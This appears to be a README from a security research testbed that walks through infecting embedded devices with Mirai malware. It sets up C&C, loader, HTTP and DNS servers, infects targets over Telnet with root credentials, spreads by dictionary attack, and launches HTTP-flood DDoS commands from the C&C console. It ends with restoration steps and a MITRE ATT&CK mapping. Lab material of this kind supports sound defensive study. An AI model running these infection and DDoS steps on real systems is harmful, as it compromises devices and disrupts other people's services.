# Mirai Malware 

## Attack Overview
In this scenario, you are an attacker who has gained root access to a target device. The goal of this attack is to infect the device with the [Mirai malware](https://github.com/jgamblin/Mirai-Source-Code). Once the first device is infected, the malware will attempts to spread to other devices on the network, thereby creating a botnet. As the attacker, you will be able to control all infected devices through a Command and Control (C&C) server. From the C&C server, you can issue commands to instruct the botnet to perform a Distributed Denial of Service (DDoS) attack.

The Mirai infection process unfolds as follows:
1. **Start Attacker Servers:** First, four servers are set up on the attacker’s machine. The Command and Control (C&C) server allows you to send commands to the infected devices. The Loader server is used to infect new devices. The HTTP server is used by the loader server to download the Mirai malware onto the target devices. Finally, a DNS server is configured so that infected devices can resolve the IP address of the C&C server.
2. **Infect a Device:** To begin the infection, the loader server connects to the target device via Telnet using the root credentials provided. It then makes an HTTP request to download the Mirai malware from the HTTP server. Once downloaded, the malware is executed on the device. Upon execution, Mirai attempts to hide itself by deleting its own binary and disabling the watchdog, which prevents the device from automatically restarting.
3. **Spread to Other Devices:** Once a device is infected, it scans the local network for other vulnerable devices. If new devices are found, the malware attempts a dictionary attack on Telnet to gain root access. When successful, the infected device sends the target’s IP address and credentials to the loader server, which then proceeds to infect the newly discovered device.

## Requirements
Before running the attack, you MUST have the testbed installed.
See the [installation guide](../../embedded-device/README.md) to install the testbed.

The following tools are required for the attack:    
    - `golang`  
    - `electric-fence`  
    - `gcc`  
    - `mysql-client`  
    - `mysql-server`  
    - `Bind9`  
    - `python3`    

Additionally, the following Python library are needed:  
    - `flask`  
    - `flask-socketio`  
    - `eventlet`  
    - `gunicorn`  

These tools and packages will be installed during the setup process, so no manual installation is necessary at this stage.

## Attack Setup
Before running the attack, we need to prepare the environment and compile the Mirai source code.

1. Launch the automated setup script to install the required tools and compile Mirai source code:
```bash
sudo ./scripts/InstallMirai.sh 
```

2. Set your IP address to 50.50.50.53/24, as this is the IP used by the DNS server to resolve the C&C, Loader, and HTTP servers:
```bash
sudo ip addr del <Current IP Address>/<Netmask> dev <Interface name>
sudo ip addr add 50.50.50.53/24 dev <Interface name>
```

> WARNING: After changing your IP, check that the target devices can still be reached. If the target devices are not on the 50.50.50.0/24 network, or if the interface used is not the default gateway, you may need to add a static route:
```bash
sudo ip route add <Devices Network IP Address>/<Netmask> dev <Interface name>
```

## Attack Execution
To execute the attack, run the following command:  
```bash
sudo ./exploit.sh 
```

Alternatively, you can run the attack in non-interactive mode using:  
```bash
sudo ./exploit.sh -all <Target IP Address> <Root Username> <Root Password>
```

Once the first device is infected, it takes around 3-5 minutes for it to discover and infect a neighboring device.

## Launch a DDoS Attack
Once the Mirai attack has been started, you can connect to the C&C server and perform a DDoS attack.

To connect to the C&C server, use the following command:
```bash
telnet 50.50.50.53
```

You can log in using the following credentials:  
Username: `mirai_user`  
Password: `mirai_password`  

Once logged in, you can initiate a DDoS attack on a web server with this command:
```
http <Web Server IP> <Attack Duration in Seconds> domain=<Web Server IP> dport=<Server Port>
```

To test the DDoS attack, we’ve set up a web server that can be targeted by Mirai. This server tracks the number of requests it receives. To start the server on the attacker machine, follow these steps:

1. Install the necessary Python packages:
```bash
sudo apt install python3 python3-pip 
pip install gunicorn==23.0.0 flask==3.1.2 flask-socketio==5.5.1 eventlet==0.40.2
```

2. Start the server:
```bash
cd mirai_setup/VictimWebServer/
gunicorn -k eventlet -w 1 -c gunicorn_config.py app:app
```

You should be able to access the web page in your browser at http://50.50.50.53:5000 

## System Restoration
To restore the system to its state prior to the attack, execute the following command:  
```bash
./restoration.sh <Target IP Address>
```

> Warning: Restoration of the Mirai Malware attack only applies to the targeted device. If other devices on the network have been infected, you must manually reboot them at the same time to ensure complete removal of the malware from the environment.

## MITRE ATT&CK Techniques List
The following table lists the MITRE ATT&CK for ICS techniques used in this attack:  

| Technique ID | Technique Name           | Justification                            |
|--------------|--------------------------|------------------------------------------|
| T0807       | Command-Line Interface    |The loader starts Mirai using the target system’s command-line interface. | 
| T0809       | Data Destruction          |Once started, Mirai deletes its binary to cover its tracks.               |
| T0812       | Default Credentials       |Mirai conducts a dictionary attack using a list of common default and weak passwords to gain access. |  
| T0840       | Network Connection Enumeration | Mirai uses the `/proc/net/tcp` file to correlate running programs with the network ports they are using.         |
| T0843       | Program Download          |The loader upload the Mirai binary on the target device.                  | 
| T0846       | Remote System Discovery   |Infected devices scan the network to discover new targets.                | 
| T0859       | Valid Accounts            |Root credentials are used to authenticate and infect target devices.      | 
| T0869       | Standard Application Layer Protocol | HTTP is used by the loader to transfer the Mirai binary to the target.                    | 
| T0872       | Indicator Removal on Host |Once started, Mirai deletes its binary to cover its tracks.               | 
| T0881       | Service Stop              |Mirai stops services on ports 22, 23, and 80 to block remote access.      | 
| T0885       | Commonly Used Port        |Ports 23 (Telnet) and 80 (HTTP) are used for exploitation and communication.                         | 
| T0886       | Remote Services           |Telnet is used by the loader to connect to and infect devices.            | 
| T0888       | Remote System Information Discovery |The loader identifies the target's architecture before downloading the appropriate Mirai binary for the system.|

> Note: This table is based on [MITRE ATT&CK for ICS v17](https://attack.mitre.org/versions/v17/matrices/ics/).